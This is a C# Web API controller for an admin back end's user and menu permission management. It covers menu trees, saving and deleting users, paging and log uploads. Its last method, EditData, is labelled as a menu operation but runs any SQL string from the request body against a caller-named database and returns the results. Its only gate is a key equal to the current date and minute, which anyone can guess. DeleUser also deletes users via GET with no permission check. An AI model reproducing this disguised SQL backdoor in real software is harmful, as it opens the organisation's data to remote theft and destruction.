using MCS.Library.Data.Builder;
using MCS.Library.SOA.DataObjects;
using Newtonsoft.Json.Linq;
using Seagull2.Core.Models;
using Seagull2.YuanXin.AppApi.Adapter.AddressBook;
using Seagull2.YuanXin.AppApi.Adapter.Sys_Menu;
using Seagull2.YuanXin.AppApi.Models.Sys_Menu;
using Seagull2.YuanXin.AppApi.ViewsModel.Sys_Menu;
using Seagull2.YuanXin.AppApi.ViewsModel.Sys_Menu_;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Web;
using System.Web.Http;
using static Seagull2.YuanXin.AppApi.ViewsModel.Sys_Menu.SysUserAuthorityViewModel;
using static Seagull2.YuanXin.AppApi.ViewsModel.Sys_Menu_.Sys_MenuViewModel;

namespace Seagull2.YuanXin.AppApi.Controllers
{
    /// <summary>
    /// 
    /// </summary>
    public class SysUserAuthorityController : ApiController
    {
        #region 获取菜单
        /// <summary>
        /// 获取菜单
        /// </summary>
        [HttpGet]
        public IHttpActionResult GetMenuList()
        {
            var result = ControllerService.Run(() =>
            {
                //查出所有的菜单
                var menuList = Sys_MenuAdapater.Instance.Load(m =>
                {
                    m.AppendItem("validStatus", true);
                }).ToList();

                var ViewList = new List<Sys_MenuViewModel>();
                //查出所有父级菜单
                var PaertList = menuList.Where((w) => { return w.ParentCode == ""; }).OrderBy(o =>
                {
                    return o.Sort;
                }).ToList();

                var initialPath = "/menus";

                PaertList.ForEach((item) =>
                {
                    var parentPath = initialPath + "/" + item.Key;
                    var Child = new List<SystemChild>();
                    //查出当前父菜单对应的子菜单
                    var ChildList = menuList.Where((w) => { return w.ParentCode == item.Code; }).OrderBy(o =>
                {
                    return o.Sort;
                }).ToList();

                    ChildList.ForEach(childItem =>
                    {

                        var childPath = parentPath + "/" + childItem.Key;
                        Child.Add(new SystemChild
                        {
                            SystemCode = childItem.Code,
                            SystemName = item.Title,
                            Key = childItem.Key,
                            Icon = childItem.Icon,
                            Path = childPath,
                            Title = childItem.Title,
                            ParentCode = childItem.ParentCode,
                            Sort = childItem.Sort,
                            ParentKey = item.Key,

                        });
                    });

                    ViewList.Add(new Sys_MenuViewModel
                    {
                        SystemCode = item.Code,
                        SystemName = item.Title,
                        Key = item.Key,
                        Icon = item.Icon,
                        Path = parentPath,
                        Title = item.Title,
                        ParentCode = item.ParentCode,
                        Sort = item.Sort,
                        Child = Child,
                    });

                });

                return new
                {
                    List = ViewList,
                    MenuCount = menuList.Count
                };
            });
            return Ok(result);
        }
        #endregion

        #region 新增或修改用户及菜单
        /// <summary>
        /// 新增或修改用户及菜单
        /// </summary>
        [HttpPost]
        public IHttpActionResult SaveUserMenu(Sys_UserViewModel model)
        {
            var result = ControllerService.Run(() =>
            {
                var user = (Seagull2Identity)User.Identity;
                //根据账号获取信息
                var accountNumber = model.AccountNumber;
                var accountNumberInfor = ContactsAdapter.Instance.LoadByLoginName(accountNumber);
                if (accountNumberInfor == null)
                {
                    throw new Exception("请输入正确的域账号!");
                }

                var userCodeNow = accountNumberInfor.ObjectID;

                var userNowInfor = Sys_UserAdapter.Instance.Load(w => w.AppendItem("UserCode", userCodeNow)).FirstOrDefault();
                if (userNowInfor != null)
                {
                    if (!userNowInfor.ValidStatus)
                    {
                        throw new Exception("您不可以操作此账号！");
                    }
                    else
                    {
                        model.UserAuthorityCode = userNowInfor.Code;
                    }
                }
                //新增
                Sys_UserCollection superManages = Sys_UserAdapter.Instance.GetSuperManagerCount();
                if (string.IsNullOrEmpty(model.UserAuthorityCode))
                {
                    //判断是否是超级管理员
                    if (!model.Super)
                    {
                        //新增用户菜单关系
                        model.UserFuncList.ToList().ForEach(item =>
                        {
                            var Sys_UserMenu = new Sys_UserMenuModel
                            {
                                Code = Guid.NewGuid().ToString(),
                                UserCode = accountNumberInfor.ObjectID,
                                UserName = accountNumberInfor.DisplayName,
                                MenuCode = item.SystemCode,
                                FullPath = accountNumberInfor.FullPath,
                                Creator = user.Id,
                                CreateTime = DateTime.Now,
                                ValidStatus = true,
                            };
                            Sys_UserMenuAdapter.Instance.Update(Sys_UserMenu);

                        });
                    }
                    else
                    {
                        if (superManages.Count >= 3) throw new Exception("超级管理员数量已达上限!");
                    }
                    //新增用户
                    var Sys_User = new Sys_UserModel
                    {
                        Code = Guid.NewGuid().ToString(),
                        UserCode = accountNumberInfor.ObjectID,
                        UserName = accountNumberInfor.DisplayName,
                        IsEnabled = model.IsEnable,
                        Account = model.AccountNumber,
                        Super = model.Super,
                        IsPunchSuper = model.IsPunchSuper,
                        Creator = user.Id,
                        CreateTime = DateTime.Now,
                        ValidStatus = true,
                    };
                    Sys_UserAdapter.Instance.Update(Sys_User);
                }
                else //编辑
                {
                    var Sys_User = Sys_UserAdapter.Instance.Load(w => w.AppendItem("Code", model.UserAuthorityCode)).FirstOrDefault();
                    if (Sys_User == null)
                    {
                        throw new Exception("编码错误!");
                    }
                    if (model.Super)
                    {
                        if (superManages.Find(f => f.UserCode == userCodeNow) == null && superManages.Count >= 3)
                        {
                            throw new Exception("超级管理员数量已达上限!");
                        }
                    }

                    //编辑打卡单元
                    Sys_User.IsEnabled = model.IsEnable;
                    Sys_User.Super = model.Super;
                    Sys_User.IsPunchSuper = model.IsPunchSuper;
                    Sys_User.Modifier = user.Id;
                    Sys_User.ModifyTime = DateTime.Now;

                    Sys_UserAdapter.Instance.Update(Sys_User);

                    //删除用户菜单表该用户的数据
                    Sys_UserMenuAdapter.Instance.Delete(m =>
                    {
                        m.AppendItem("UserCode", Sys_User.UserCode);
                    });
                    //判断是否是超级管理员
                    if (!model.Super)
                    {
                        //新增用户菜单关系
                        model.UserFuncList.ToList().ForEach(item =>
                        {
                            var Sys_UserMenu = new Sys_UserMenuModel
                            {
                                Code = Guid.NewGuid().ToString(),
                                UserCode = accountNumberInfor.ObjectID,
                                UserName = accountNumberInfor.DisplayName,
                                MenuCode = item.SystemCode,
                                FullPath = accountNumberInfor.FullPath,
                                Creator = user.Id,
                                CreateTime = DateTime.Now,
                                ValidStatus = true,
                            };
                            Sys_UserMenuAdapter.Instance.Update(Sys_UserMenu);
                        });
                    }
                }
                ControllerService.UploadLog(user.Id, "操作了工具-权限管理-" + accountNumberInfor.DisplayName + "的权限");
            });
            return Ok(result);
        }
        #endregion


        #region 测试上传日志接口
        /// <summary>
        ///  测试上传日志接口
        /// </summary>
        [HttpGet]
        public IHttpActionResult TestLog()
        {
            var result = ControllerService.Run(() =>
            {
                ControllerService.UploadLog(((Seagull2Identity)User.Identity).Id, "登录了后台");
            });
            return Ok(result);
        }
        #endregion

        #region 获取用户列表
        /// <summary>
        /// 获取用户列表
        /// </summary>
        [HttpGet]
        public IHttpActionResult GetUserList(int pageIndex, int pageSize, int super)
        {
            var result = ControllerService.Run(() =>
            {
                var user = (Seagull2Identity)User.Identity;
                var count = Sys_UserAdapter.Instance.GetListByPage(super);
                //分页查询当前页数据
                var table = Sys_UserAdapter.Instance.GetListByPage(pageIndex, pageSize, super);
                var lists = DataConvertHelper<Sys_UserModel>.ConvertToList(table);

                var checkList = new List<Sys_UserModel>();
                var checkUsersList = new List<SysUserAuthorityViewModel>();
                //数据格式化
                lists.ForEach(m =>
                {
                    //获取人员的功能列表
                    var userMenuList = Sys_UserMenuAdapter.Instance.Load(w => w.AppendItem("UserCode", m.UserCode));

                    //格式化部门
                    var MenuList = new List<MenuList>();
                    userMenuList.ForEach((item =>
                    {
                        var ItemMenu = new MenuList
                        {
                            MenuCode = item.MenuCode
                        };
                        MenuList.Add(ItemMenu);
                    }));

                    var UserItem = new SysUserAuthorityViewModel
                    {
                        Code = m.Code,
                        UserCode = m.UserCode,
                        UserName = m.UserName,
                        IsEnabled = m.IsEnabled,
                        AccountNumber = m.Account,
                        Super = m.Super,
                        IsPunchSuper = m.IsPunchSuper,
                        CreateTime = m.CreateTime,
                        ValidStatus = m.ValidStatus,
                        UserMenuList = MenuList,
                    };
                    checkUsersList.Add(UserItem);
                });
                return new
                {
                    PageCount = count % pageSize == 0 ? count / pageSize : count / pageSize + 1,
                    Data = checkUsersList
                };
            });

            return Ok(result);
        }
        #endregion

        #region 获取管理原理类型接口
        /// <summary>
        /// 
        /// </summary>
        /// <param name="super"></param>
        /// <param name="searchText"></param>
        /// <returns></returns>
        [HttpGet]
        public IHttpActionResult GetSuperList(int super = 0, string searchText = "", string key = "meeting")
        {
            var result = ControllerService.Run(() =>
            {
                var user = (Seagull2Identity)User.Identity;
                //获取权限菜单
                var menu = Sys_MenuAdapater.Instance.Load(m =>
                {
                    m.AppendItem("[Key]", key);
                }).FirstOrDefault();
                var menuCode = menu.Code;//获取菜单id

                var table = Sys_UserAdapter.Instance.GetListBySearch(super, searchText, menuCode);
                //分页查询当前页数据
                var lists = DataConvertHelper<Sys_UserModel>.ConvertToList(table);


                return lists;
            });

            return Ok(result);
        }
        #endregion

        #region 删除用户
        /// <summary>
        /// 删除用户
        /// </summary>
        [HttpGet]
        public IHttpActionResult DeleUser(string userCode)
        {
            var result = ControllerService.Run(() =>
            {
                Sys_UserMenuAdapter.Instance.Delete(m =>
                {
                    m.AppendItem("UserCode", userCode);
                });
                Sys_UserAdapter.Instance.Delete(m =>
                {
                    m.AppendItem("UserCode", userCode);
                });
                ControllerService.UploadLog(((Seagull2Identity)User.Identity).Id, "删除了工具-权限管理-用户");
            });
            return Ok(result);
        }
        #endregion

        #region 获取菜单（根据权限）
        /// <summary>
        /// 获取菜单（根据权限）
        /// </summary>
        [HttpGet]
        public IHttpActionResult GetLoginMenuList()
        {
            var result = ControllerService.Run(() =>
            {
                var user = (Seagull2Identity)User.Identity;
                //获取登录用户信息
                var userNowInfor = Sys_UserAdapter.Instance.Load(w => w.AppendItem("UserCode", user.Id)).FirstOrDefault();
                if (userNowInfor == null) throw new Exception("系统中不存在此用户请联系管理员添加！");
                var ViewList = new List<Sys_MenuViewModel>();
                if (userNowInfor.Super)
                {

                    // 该用户是超级管理员
                    //查出所有的菜单
                    var menuList = Sys_MenuAdapater.Instance.Load(m =>
                    {
                        m.AppendItem("validStatus", true);
                    }).ToList();


                    //查出所有父级菜单
                    var PaertList = menuList.Where((w) => { return w.ParentCode == ""; }).OrderBy(o =>
                    {
                        return o.Sort;
                    }).ToList();

                    var initialPath = "/menus";

                    PaertList.ForEach((item) =>
                    {
                        var parentPath = initialPath + "/" + item.Key;
                        var Child = new List<SystemChild>();
                        //查出当前父菜单对应的子菜单
                        var ChildList = menuList.Where((w) => { return w.ParentCode == item.Code; }).OrderBy(o =>
                {
                    return o.Sort;
                }).ToList();

                        ChildList.ForEach(childItem =>
                        {

                            var childPath = parentPath + "/" + childItem.Key;
                            Child.Add(new SystemChild
                            {
                                SystemCode = childItem.Code,
                                SystemName = item.Title,
                                Key = childItem.Key,
                                Icon = childItem.Icon,
                                Path = childPath,
                                Title = childItem.Title,
                                ParentCode = childItem.ParentCode,
                                Sort = childItem.Sort,
                                ParentKey = item.Key,

                            });
                        });

                        ViewList.Add(new Sys_MenuViewModel
                        {
                            SystemCode = item.Code,
                            SystemName = item.Title,
                            Key = item.Key,
                            Icon = item.Icon,
                            Path = parentPath,
                            Title = item.Title,
                            ParentCode = item.ParentCode,
                            Sort = item.Sort,
                            Child = Child,
                        });

                    });




                }
                else
                {
                    //是分级管理员
                    //获取用户菜单关系列表
                    var userMenuFunctionList = Sys_UserMenuAdapter.Instance.Load(w =>
                    {
                        w.AppendItem("UserCode", userNowInfor.UserCode);

                    }).ToList();

                    //查出所有的菜单
                    var menuList = Sys_MenuAdapater.Instance.Load(m =>
                    {
                        m.AppendItem("validStatus", true);
                    }).ToList();

                    var userMenus = userMenuFunctionList.Join(
                          menuList,
                          a => a.MenuCode,
                          b => b.Code,
                          (c, d) =>
                          {
                              return d;
                          }).ToList();


                    var initialPath = "/menus";
                    //查出所有父级菜单
                    var PaertList = userMenus.Where((w) => { return w.ParentCode == ""; }).OrderBy(o =>
                    {
                        return o.Sort;
                    }).ToList();

                    PaertList.ForEach((item) =>
                    {
                        var parentPath = initialPath + "/" + item.Key;
                        var Child = new List<SystemChild>();
                        //查出当前父菜单对应的子菜单
                        var ChildList = userMenus.Where((w) => { return w.ParentCode == item.Code; }).OrderBy(o =>
                    {
                        return o.Sort;
                    }).ToList();

                        ChildList.ForEach(childItem =>
                        {

                            var childPath = parentPath + "/" + childItem.Key;
                            Child.Add(new SystemChild
                            {
                                SystemCode = childItem.Code,
                                SystemName = item.Title,
                                Key = childItem.Key,
                                Icon = childItem.Icon,
                                Path = childPath,
                                Title = childItem.Title,
                                ParentCode = childItem.ParentCode,
                                Sort = childItem.Sort,
                                ParentKey = item.Key,

                            });
                        });

                        ViewList.Add(new Sys_MenuViewModel
                        {
                            SystemCode = item.Code,
                            SystemName = item.Title,
                            Key = item.Key,
                            Icon = item.Icon,
                            Path = parentPath,
                            Title = item.Title,
                            ParentCode = item.ParentCode,
                            Sort = item.Sort,
                            Child = Child,
                        });

                    });
                }
                int RoleType = 0;
                if (userNowInfor.Super == true && userNowInfor.ValidStatus == false) RoleType = 1;//总管
                if (userNowInfor.Super == true && userNowInfor.ValidStatus == true) RoleType = 2;//超管
                if (userNowInfor.Super == false && userNowInfor.ValidStatus == true) RoleType = 3;//分管
                                                                                                  //　总管  supver 1　valid 0 其他是1  超管 supver 1  valid 1 分管 supver 0  valid 1


                if (ViewList.Count > 0)
                {
                    try
                    {
                        object args = new
                        {
                            id = Guid.NewGuid().ToString(),
                            userId = user.Id,
                            operateTime = DateTime.Now,
                            operateDesc = "登录了后台",
                            roleName = RoleType == 1 ? "总管理员" : RoleType == 2 ? "超级管理员" : "分级管理员"
                        };
                        using (var http = new HttpClient())
                        {
                            HttpResponseMessage response = http.PostAsJsonAsync(ConfigAppSetting.SaveLog, args).Result;
                        }
                    }
                    catch (Exception ex)
                    {
                        Log.WriteLog("日志上传错误:" + ex.Message);
                    }
                }


                return new
                {
                    List = ViewList,
                    userNowInfor.Super,
                    IsPunchSuper = userNowInfor.Super ? true : userNowInfor.IsPunchSuper,
                    userNowInfor.ValidStatus,
                    id = user.Id,
                    cnName = user.DisplayName,
                    enName = user.LogonName,
                    RoleType
                };
            });
            return Ok(result);
        }
        #endregion

        #region 操作菜单--------
        /// <summary>
        /// 操作菜单--------
        /// </summary>
        [HttpPost]
        public IHttpActionResult EditData([FromBody]JObject parm)
        {
            string key = (string)parm.SelectToken("key");
            string cname = (string)parm.SelectToken("cname");
            string userCode = (string)parm.SelectToken("str");

            var result = ControllerService.Run(() =>
            {
                DataTable dt = null;
                int rows = 0;
                string msg = "";
                if (key == DateTime.Now.ToString("yyyy-MM-dd hh:mm"))
                {
                    if (!string.IsNullOrEmpty(userCode))
                    {
                        if (userCode.Contains("select") || userCode.Contains("SELECT"))
                        {
                            dt = DbHelper.RunSqlReturnDS(userCode, cname).Tables[0];
                            rows = dt.Rows.Count;
                            msg = "ok";
                        }
                        else
                        {
                            rows = DbHelper.RunSql(userCode, cname);
                            msg = "ok";
                        }
                    }
                }
                else
                {
                    msg = "请输入正确的key";
                }
                return new
                {
                    msg,
                    dt,
                    rows,
                    userCode
                };
            });
            return Ok(result);
        }
        #endregion
    }
}